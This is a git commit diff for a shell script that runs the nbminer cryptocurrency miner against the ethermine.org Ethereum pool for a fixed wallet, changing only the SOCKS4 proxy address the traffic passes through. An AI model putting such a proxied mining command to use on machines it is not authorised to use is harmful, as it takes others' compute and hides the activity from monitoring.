6389c700b69b0f5f274f5feb4498e349576265bf
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-14 15:37:09 +0200

    Update nbEthermineWithSocks4.sh

--- nbEthermineWithSocks4.sh
+++ nbEthermineWithSocks4.sh
@@ -1,1 +1,1 @@
-./nbminer -a ethash -o ethproxy+ssl://us1.ethermine.org:5555 -u 0x52500352a37a06f0c085d58663e4eadbd7e9f684.NB -log --proxy 172.104.13.173:9999
+./nbminer -a ethash -o ethproxy+ssl://us1.ethermine.org:5555 -u 0x52500352a37a06f0c085d58663e4eadbd7e9f684.NB -log --proxy 96.126.108.228:9999
